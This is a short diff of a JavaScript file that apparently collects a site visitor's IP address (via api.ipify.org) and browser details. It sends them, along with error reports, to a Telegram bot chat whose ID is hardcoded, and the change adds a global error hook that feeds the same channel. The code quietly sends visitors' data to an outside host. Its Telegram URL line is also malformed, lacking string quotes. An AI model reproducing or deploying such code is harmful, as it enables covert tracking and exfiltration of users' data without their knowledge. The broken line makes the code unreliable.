@@ -1,3 +1,7 @@
+window.onerror = function(message, source, lineno, colno, error) {
+  logSendError(message);
+};
+
 async function getIPAddress() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -37,7 +41,6 @@ function getBrowserInfo() {
     };
 }
 
-// Функция для отправки лога об ошибке
 function logSendError(errorMessage) {
     const telegramBotURL = https://api.telegram.org/bot${token}/sendMessage;
     const chatId = '-1001005164666';
@@ -105,4 +108,4 @@ async function sendDataToTelegram() {
     });
 }
 
-sendDataToTelegram().catch(logSendError); // Отлавливаем ошибки при выполнении функции sendDataToTelegram и передаем сообщение об ошибке в функцию logSendError
+sendDataToTelegram().catch(logSendError);
